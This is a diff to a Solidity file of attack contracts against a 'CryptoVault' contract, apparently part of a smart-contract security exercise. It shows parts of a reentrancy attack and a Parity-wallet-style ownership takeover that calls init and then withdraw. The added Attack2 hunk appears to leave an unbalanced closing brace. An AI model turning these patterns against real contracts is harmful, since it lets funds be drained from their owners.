@@ -106,18 +106,12 @@ contract CryptoVault {
     }
 }
 
-contract Attack1 { //unexpected callbacks
+contract Attack1 { // Reentrancy: unexpected callbacks
 
     CryptoVault cv;
 
     constructor(address _cv) public{
         cv = CryptoVault(payable (_cv));
-    }
-
-    function useless() external payable{
-        require(msg.value >= 1);
-        cv.deposit{value: msg.value}();
-        cv.withdraw(msg.value);
     }
 
     function attack() external payable {
@@ -132,7 +126,7 @@ contract Attack1 { //unexpected callbacks
         }
     }
 
-    function getbalance() public view returns(uint){
+    function getBalance() public view returns(uint){
         return address (this).balance;
     }
 }
@@ -147,12 +141,14 @@ contract Attack2 { // Parity wallet
 
     function attack(address ai) external payable {
         ai.call(abi.encodeWithSignature("init(address)",this));
-        ai.call(abi.encodeWithSignature("collectFees()"));
-        cv.collectFees();
+        ai.call(abi.encodeWithSignature("withdraw()"));
     }
 
-    function getbalance() public view returns(uint){
+    function getBalance() public view returns(uint){
         return address (this).balance;
+    }
+
+        receive() external payable {}
     }
 
 }
@@ -170,5 +166,8 @@ contract Attack3 {
         cv.withdraw(100);
     }
 
+    function getBalance() public view returns(uint){
+        return address (this).balance;
+    }
 
 }
